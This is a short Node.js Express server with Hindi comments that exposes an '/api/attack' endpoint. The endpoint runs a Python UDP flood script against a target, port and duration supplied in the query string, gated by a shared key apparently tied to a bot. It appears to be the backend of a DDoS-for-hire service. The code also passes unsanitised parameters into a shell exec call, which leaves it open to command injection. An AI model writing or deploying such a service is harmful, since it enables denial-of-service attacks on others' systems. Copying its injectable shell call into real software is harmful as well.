const express = require('express');
const { exec } = require('child_process');
const app = express();
const PORT = 6000; // पूरी तरह से खाली और सुरक्षित पोर्ट

// रूट पाथ चेक करने के लिए (ताकि ब्राउज़र में टेस्ट हो सके)
app.get('/', (req, res) => {
    res.send("API Server is alive and working!");
});

// एंडपॉइंट: /api/attack
app.get('/api/attack', (req, res) => {
    const { key, target, port, time } = req.query;

    // जो पासवर्ड (API Key) आपने बॉट में रखा है, उसे यहाँ डालें
    const MY_SECRET_KEY = "YOUR_CONF_KEY"; 
    if (!key || key !== MY_SECRET_KEY) {
        return res.status(403).send("Unauthorized: Invalid Key");
    }

    if (!target || !port || !time) {
        return res.status(400).send("Missing parameters!");
    }

    // आपकी पायथन अटैक स्क्रिप्ट को बैकग्राउंड में रन करना
    const command = `python3 udp_flood.py ${target} ${port} ${time}`;

    exec(command, (error, stdout, stderr) => {
        if (error) {
            console.error(`Execution Error: ${error.message}`);
            return;
        }
        console.log(`Attack triggered successfully: ${stdout}`);
    });

    return res.status(200).send("Attack started");
});

// सर्वर को बिना क्रैश हुए चालू रखना
app.listen(PORT, '0.0.0.0', () => {
    console.log(`API Server running perfectly on port ${PORT}`);
});
